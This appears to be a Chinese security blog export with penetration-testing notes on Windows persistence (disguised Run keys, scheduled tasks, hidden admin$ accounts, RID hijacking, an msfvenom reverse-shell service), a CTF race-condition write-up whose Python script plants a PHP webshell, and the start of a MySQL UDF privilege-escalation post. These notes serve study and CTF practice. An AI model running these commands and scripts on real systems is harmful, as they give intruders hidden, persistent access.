class="code"><pre><code class="hljs moonscript">upload /root/nc.exe <span class="hljs-name">C</span>:\\windows\\system32<br>shell<br>reg query HKLM\software\microsoft\windows\currentversion\run<br>reg add HKLM\software\microsoft\windows\currentversion\run /v GoogleUpdate /t REG_SZ /d <span class="hljs-string">&quot;C:\windows\temp\GoogleUpdate.exe&quot;</span><br>reg query HKLM\software\microsoft\windows\currentversion\run /v GoogleUpdate<br>shutdown -r -f -t <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="Schtasks计划任务"><a href="#Schtasks计划任务" class="headerlink" title="Schtasks计划任务"></a>Schtasks计划任务</h1><p>这个方式很常用，可以定时执行我们指定的payload</p><h2 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h2><blockquote><p>  创建test定时任务，每分钟执行一次5555.exe  </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /sc MINUTE /mo 1 /tr C:\Users\Administrator\Desktop\6666.exe /tn <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>命令解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create<br><span class="hljs-comment"># 创建新的计划任务</span><br><br>/sc schedule<br><span class="hljs-comment"># 指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</span><br><br>/mo modifier<br><span class="hljs-comment"># 指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</span><br><br>/tr &lt;TaskRun&gt;<br><span class="hljs-comment"># 指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在 %Systemroot%\System32 目录下。</span><br><br>/tn &lt;TaskName&gt;<br><span class="hljs-comment"># 指定任务的名称。</span><br></code></pre></td></tr></table></figure><p>常用命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 每分钟执行一次任务</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> MINUTE <span class="hljs-string">/mo</span> 1 <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;C:\windows\temp\5555.exe&quot;</span><br><br><span class="hljs-comment"># 每小时执行一次任务</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> HOURLY <span class="hljs-string">/mo</span> 1 <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/tr</span>  <span class="hljs-string">&quot;C:\windows\temp\5555.exe&quot;</span><br><br><span class="hljs-comment"># 每天执行一次任务</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> DAILY <span class="hljs-string">/mo</span> 1 <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/tr</span>  <span class="hljs-string">&quot;C:\windows\temp\5555.exe&quot;</span><br><br><span class="hljs-comment"># 每周执行一次任务</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> WEEKLY <span class="hljs-string">/mo</span> 1 <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/tr</span>  <span class="hljs-string">&quot;C:\windows\temp\5555.exe&quot;</span><br><br><span class="hljs-comment"># 删除计划任务</span><br>schtasks <span class="hljs-string">/delete</span> <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/F</span><br></code></pre></td></tr></table></figure><blockquote><p>  schtasks命令详解： <a href="https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html">https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html</a>  </p></blockquote><h2 id="schtasks-powershell"><a href="#schtasks-powershell" class="headerlink" title="schtasks+powershell"></a>schtasks+powershell</h2><blockquote><p><a href="https://mp.weixin.qq.com/s/Tt6REDrPH-WWgMB-mIOnTA">https://mp.weixin.qq.com/s/Tt6REDrPH-WWgMB-mIOnTA</a></p><p>  利用PowerShell启动时执行Get-Variable执行恶意文件  </p></blockquote><ol><li><p>将恶意程序放在 %APPDATA%\Local\Microsoft\WindowsApps 目录下并重命名为 Get-Variable.exe</p></li><li><p>创建计划任务实现持久化</p></li></ol>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">schtasks.exe<span class="hljs-symbol">&amp;nbsp;</span>/create<span class="hljs-symbol">&amp;nbsp;</span>/tn<span class="hljs-symbol">&amp;nbsp;</span>COMSurrogate<span class="hljs-symbol">&amp;nbsp;</span>/st<span class="hljs-symbol">&amp;nbsp;</span>00:00<span class="hljs-symbol">&amp;nbsp;</span>/du<span class="hljs-symbol">&amp;nbsp;</span>9999:59<span class="hljs-symbol">&amp;nbsp;</span>/sc<span class="hljs-symbol">&amp;nbsp;</span>once<span class="hljs-symbol">&amp;nbsp;</span>/ri<span class="hljs-symbol">&amp;nbsp;</span>1<span class="hljs-symbol">&amp;nbsp;</span>/f<span class="hljs-symbol">&amp;nbsp;</span>/tr<span class="hljs-symbol">&amp;nbsp;</span>&quot;powershell.exe<span class="hljs-symbol">&amp;nbsp;</span>-windowstyle<span class="hljs-symbol">&amp;nbsp;</span>hidden&quot;<br></code></pre></td></tr></table></figure><ol start="3"><li><p>该命令创建计划任务程序 COMSurrogate，该程序以隐藏的方式执行PowerShell。而执行  PowerShell 会启动恶意程序 GetVariable.exe，从而实现持久化。  </p><p>原理：通过运行PowerShell时触发执行 Get-variable 来实现攻击</p></li></ol><h1 id="账户隐藏"><a href="#账户隐藏" class="headerlink" title="账户隐藏"></a>账户隐藏</h1><p>就是创建一个隐藏用户，用户登录</p><p>隐藏用户的话通过 net user 是发现不了的，只有在控制面版里面的管理账户界面可以看到</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> <span class="hljs-keyword">admin</span>$ AdminPassw0ad /<span class="hljs-keyword">add</span> &amp;&amp; net localgroup administrators <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p>结尾使用<code>$</code>的意思就是隐藏用户</p><p>激活Guest用户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">guest</span> Admin@hacker &amp;&amp; net localgroup administrators guest /add<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">guest</span> /active:yes<br></code></pre></td></tr></table></figure><h1 id="RID-劫持"><a href="#RID-劫持" class="headerlink" title="RID 劫持"></a>RID 劫持</h1><blockquote><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">https://3gstudent.github.io/</a><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">渗透技巧</a><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">-Windows</a><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">系统的帐户隐藏</a></p></blockquote><h2 id="RID"><a href="#RID" class="headerlink" title="RID"></a>RID</h2><blockquote><p>  Relative Identifier 相对标识符  Windows系统账户对应固定的RID：  </p></blockquote><blockquote><p>500:Administrator<br>501:Guest<br>502:krbtgt(域)<br>512:Domain Admins(域)<br>513:Domain Users(域)<br>514:Domain Guests(域)<br>515:Domain Computers(域)<br>516:Domain Controllers(域)</p></blockquote><h2 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h2><p>Security  Identifiers 安全标识符  </p><blockquote><p>安全标识符用于唯一标识安全主体或安全组。 安全主体可以表示可由操作系统进行身份验证的任何实  体，例如用户帐户、计算机帐户或在用户或计算机帐户的安全上下文中运行的线程或进程。  </p></blockquote><blockquote><p>  <a href="https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-identifiers">https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-</a>  <a href="https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-identifiers">identiﬁers</a>  </p></blockquote><blockquote><p>用户使用帐户名引用帐户，但是操作系统内部使用其安全标识符(SID)引用在帐户的安全上下文中运行  的帐户和进程。对于域帐户，通过将域的SD与该帐户的相对标识符(RID)串联来创建安全主体的SID。  SID在其范围内（域或本地）是唯一的，并且永不重用。  </p></blockquote><h2 id="RID-劫持-1"><a href="#RID-劫持-1" class="headerlink" title="RID 劫持"></a>RID 劫持</h2><blockquote><p>通过覆写注册表数据，可以在被攻击设备上劫持任意用户的RID，并将其分配给另外一个用户  </p><p>被劫持账户没有启用的情况，依旧可以达到劫持效果  </p><p>被分配的用户拥有被劫持用户的权限  </p><p>被分配用户的操作会以被劫持用户的身份留存事件日志  </p></blockquote><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">对于Windows系统来说，注册表 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下包含当前系统的所有账户列表，每个账户的默认键值对应账户详细信息的注册表位置（即RID的十六进制表示）<br>创建克隆 administrator 的账号，且通过命令 net user 以及控制面板中的管理账户无法看到<br></code></pre></td></tr></table></figure><ol><li><p>用’$’创建匿名用户，并归到 administrators 用户组</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> <span class="hljs-keyword">admin</span>$ <span class="hljs-keyword">admin</span>@<span class="hljs-number">123</span> /<span class="hljs-keyword">add</span> /y<br>net localgroup administrators <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br>net localgroup &quot;remote desktop users&quot; <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216145101156.png" alt="image-20240216145101156"></p><p>这个时候通过控制面板还是可以看到</p></li><li><p>将 administrator 用户对应的 Users 中的 F 值复制替换后门账户的 F值</p></li></ol><p>   导出匿名用户对应的sam目录下的注册表键值：  </p><p>   regedt32.exe 打开 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users 键值，导出 Names  下用户目录以及对应的16进制目录。  </p><p>   注意：SAM 下的注册表选项需要获得 system 权限才能读取，因此需要给 Administrator 用户赋予  SAM 键值权限，默认是不允的。  </p><p>   或者直接修改 admin$ 用户的 F 值，把其中的 F2 03 修改为 F4 01 即可</p><ol><li><p>首先找到这个sam 然后修改权限，不然是看不到数据的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216151845729.png" alt="image-20240216151845729"></p><p>administrarot 是完全可以控制</p></li><li><p>导出管理员账户的对应的值</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152325067.png" alt="image-20240216152325067"></p><p>查看这个值为1f4 对应就是500</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152409726.png" alt="image-20240216152409726"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152502912.png" alt="image-20240216152502912"></p></li><li><p>找到我们创建的用户</p><p>然后导出该用户的对应值</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152541251.png" alt="image-20240216152541251"></p><p>然后将该用户导出来</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152711441.png" alt="image-20240216152711441"></p><p>双击就能导入</p></li><li><p>修改我们创建用户的F值</p><p>有两种方式</p><ul><li><p>直接修改</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153054698.png" alt="image-20240216153054698"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153010574.png" alt="image-20240216153010574"></p><p>注意这个值是反的</p><p>我们修改为管理员的f 值</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153200582.png" alt="image-20240216153200582"></p></li><li><p>修改导出的文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153313303.png" alt="image-20240216153313303"></p><p>将这个值直接粘贴成管理员用户的值</p><p>然后删除我们创建的用户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">admin</span>$ /del<br></code></pre></td></tr></table></figure><p>删除之后导入admin$ 一套的reg文件</p><p>可以使用双击或者一下的命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">regedit</span> /s <span class="hljs-number">1</span>.reg<br><span class="hljs-attribute">regedit</span> /s <span class="hljs-number">2</span>.reg<br></code></pre></td></tr></table></figure><p>用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里  面有用户记录，其他地方都不存在用户的信息。net user 或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。</p></li></ul></li><li><p>检查是否存在</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153934969.png" alt="image-20240216153934969"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153955507.png" alt="image-20240216153955507"></p><p>成功隐藏</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216154822379.png" alt="image-20240216154822379"></p><p>使用该用户登录，发现桌面和Administrator 的一样</p><p>警告是因为由于两个同时登录</p></li></ol><h1 id="文件夹启动"><a href="#文件夹启动" class="headerlink" title="文件夹启动"></a>文件夹启动</h1><p>这个现在很少用到了</p><blockquote><p>  在每次开机或重启的时候就会运行启动文件夹下的程序  </p></blockquote><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\&#123;UserName&#125;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br><br><span class="hljs-name">C</span>:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup<br></code></pre></td></tr></table></figure><h1 id="通过服务的方式自启动"><a href="#通过服务的方式自启动" class="headerlink" title="通过服务的方式自启动"></a>通过服务的方式自启动</h1><ol><li><p>生成一个可以与服务管理器交互的（防止下线）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.58.144 <span class="hljs-attribute">lport</span>=8989 -f exe-service -o GoogleUpdate.exe<br></code></pre></td></tr></table></figure></li><li><p>sc创建一个GoogleUpdateService服务，执行我们上传的木马</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sc create GoogleUpdateService binPath<span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\Windows\temp\GoogleUpdate.exe&quot;</span> displayname<span class="hljs-operator">=</span><span class="hljs-string">&quot;GoogleUpdateService&quot;</span> start<span class="hljs-operator">=</span> auto<br><br></code></pre></td></tr></table></figure><p>  重启权限维持。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>条件竞争</title>
    <link href="/2024/02/15/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2024/02/15/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[<h1 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h1><p>0x00 </p><ol><li>条件竞争</li><li>session 上传文件写webshell</li></ol><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6/image-20240215225058016.png" alt="image-20240215225058016"></p><p>发现有另两种方式可以利用，一种是使用eval 或者是使用 文件包含</p><p>可以发现使用命令执行的话限制挺大的</p><p>既然可以看phpinfo 就尝试看一下phpinfo</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6/image-20240215225301719.png" alt="image-20240215225301719"></p><p>发现session 是支持</p><p>0x02 </p><p>尝试使用session 实现文件包含</p><blockquote><p>然后尝试用session文件包含，一般利用GET传参将我们构造好的恶意代码传入session中的，但没有 GET 传参还能往 session 中写入代码吗？当然可以，php 5.4后添加了 session.upload_progress 功能，这个功能开启意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中，利用这个特性可以将恶意语句写入session文件。</p><p>原文链接：<a href="https://blog.csdn.net/qq_46266259/article/details/128867195">https://blog.csdn.net/qq_46266259/article/details/128867195</a></p></blockquote><p>这里直接使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 多线程</span><br><br><span class="hljs-keyword">from</span> cffi.backend_ctypes <span class="hljs-keyword">import</span> xrange<br><br>sessid = <span class="hljs-string">&#x27;0&#x27;</span><br>target = <span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28331/&#x27;</span><br>file = <span class="hljs-string">&#x27;ph0ebus.txt&#x27;</span>  <span class="hljs-comment"># 上传文件名</span><br>f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)  <span class="hljs-comment"># 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(target, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                     files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        resp = session.post(<br>            <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cd /;ls;cat nssctfasdasdflag&#x27;);&quot;</span>)<br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]retry&quot;</span>)<br>            <span class="hljs-comment"># print(resp.text)</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):  <span class="hljs-comment"># 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好</span><br>            threading.Thread(target=write, args=(session,)).start()<br>            <span class="hljs-comment"># target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br><br></code></pre></td></tr></table></figure><p>这个脚本的本质就是模拟发包使用Session</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6/image-20240215225730961.png" alt="image-20240215225730961"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>条件竞争</title>
    <link href="/2024/02/15/CTF/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2024/02/15/CTF/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>可以理解为多线程中，没有对一个资源进行上锁处理，发现竞争</p><blockquote><p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现<code>bug</code>。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。说的通俗一点，条件竞争涉及到的就是操作系统中所提到的进程或者线程同步的问题，当一个程序的运行的结果依赖于线程的顺序，处理不当就会发生条件竞争。</p></blockquote><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><ol><li><p>条件竞争</p><p>系统中，最小的运算调度单位是线程，每一个线程都依附于一个进程。进程里有多个线程。一个进程里的多线程是资源共享的，多进程之间也可以出现资源共享的情况。倘若此时多线程或者多进程对同一个资源都要利用的话就产生了竞争</p></li><li><p>进程</p><p>进程是系统进行资源分配和调度的独立单位，每一个进程都有自己的独立的内存空间，不同的京进程之间通过通道进行通信。每一个进程都有自己的独立的资源，内存，栈区，寄存器，虚拟内存，文件句柄等</p></li><li><p>线程</p><p>线程的目的是降低上下文切换的消耗，提高系统的并发性。实现了进程并发，一个进程可以做更多的事情线程自己基本上不拥有系统资源,只拥有一点在 运行中必不可少的资源(如程序计数器,一组寄 存器和栈),但是它可与同属一个进程的其他的 线程共享进程所拥有的全部资源。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易 丢失数据。</p></li><li><p>session </p><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p></li></ol><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>我们可以一直上传文件，且文件会在后端金国检查如果发现这个文件不符合需求的话就会将其删除，但是这种情况下，只要我们访问的那么就可以赶在文件删除之前进行访问。如果访问的同时写入shell 那我们就成功的留下了一个webshell 在服务器上</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用程序提权</title>
    <link href="/2024/02/15/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/"/>
    <url>/2024/02/15/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>目标主机开启MySQL远程连接，并且攻击者已经获得MySQL数据库连接的用户名和密码信息，通过  UDF手工提权获得操作系统管理员权限。  </p><ol><li>拥有数据库账号密码，可以远程连接数据  </li><li>拥有Webshell，可以连接数据库  </li><li>能够写文件  </li><li>可以操作数据库</li></ol><p>如果获取数据库的密码</p><ol><li>找到数据库的配置文件</li><li>通过webshell 对数据库进行本地爆破<ul><li>msf</li><li>或者专门爆破数据库的工具</li></ul></li><li>hash 获取 Mysql 密码</li></ol><h2 id="UDA提权简介"><a href="#UDA提权简介" class="headerlink" title="UDA提权简介"></a>UDA提权简介</h2><ol><li><p>UDA 提权</p><blockquote><p> UDF提权指的是利用注入漏洞或其他漏洞获取了数据库操作权限后，通过数据库输出具有提权功能的文件并执行提权操作。</p></blockquote><p>简单的说就是使用 用户自定义函数进行加载payload 只不过这里的payload 格式是dll文件形式的</p></li><li><p>UDF介绍  </p><blockquote><p>UDF: User  Defined Function(用户自定义函数)，为用户提供了一种高效创建函数的方式  </p><p>攻击者编写调用系统cmd命令（linux下相当于调用shell命令）的udf.dll文件，并将udf.dll导  出到指定目录下，攻击者创建一个指向udf.dll的自定义函数func，每次在数据库查询中执行func函数等价于在cmd命令中执行命令。</p></blockquote></li><li><p>dll 文件存放的目录</p><p>这个目录用于应用或者系统加载dll 文件</p><blockquote><p> Windows 2003：C:\windows\目录下  </p></blockquote><blockquote><p> MySQL 5.1 